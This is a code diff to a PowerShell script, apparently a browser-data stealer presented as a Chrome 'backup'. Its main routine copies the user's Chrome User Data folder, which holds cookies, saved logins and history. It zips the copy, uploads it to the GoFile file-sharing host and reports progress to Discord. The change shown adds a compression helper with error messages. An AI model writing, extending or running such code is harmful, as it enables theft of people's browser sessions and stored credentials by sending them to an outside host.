@@ -88,7 +88,33 @@ function Copy-ChromeData {
     return $success
 }
 
-# Main process
+# Compress and clean up
+function Compress-Backup {
+    param ([string]$tempFolder, [string]$outputZip)
+    
+    try {
+        # Check if the temp folder contains any files
+        $files = Get-ChildItem -Path $tempFolder -Recurse
+        if ($files.Count -eq 0) {
+            Log-Message "Temp folder is empty. No files to zip."
+            Send-DiscordMessage "No files to zip in the Chrome backup."
+            return $false
+        }
+
+        # Compress the folder
+        Log-Message "Starting compression of $tempFolder..."
+        Compress-Archive -Path "$tempFolder\*" -DestinationPath $outputZip -Force
+        Log-Message "Compression complete. Zip file created: $outputZip"
+
+        return $true
+    } catch {
+        Log-Message "Error during compression: $_"
+        Send-DiscordMessage "Error compressing Chrome backup."
+        return $false
+    }
+}
+
+# Main Process
 function Main {
     # Prepare directories and file paths
     $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
@@ -114,14 +140,15 @@ function Main {
     }
 
     # Step 4: Compress and clean up
-    Compress-Archive -Path "$tempFolder\*" -DestinationPath $outputZip -Force
-    Remove-Item -Recurse -Force $tempFolder
+    if (Compress-Backup -tempFolder $tempFolder -outputZip $outputZip) {
+        Remove-Item -Recurse -Force $tempFolder
+    }
 
     # Step 5: Upload the zip file to GoFile
     if (Test-Path $outputZip) {
         Upload-FileToGoFile -filePath $outputZip
     } else {
-        Log-Message "Zip file not found."
+        Log-Message "Zip file not found after compression."
         Send-DiscordMessage "Failed to create the zip file."
     }
 }
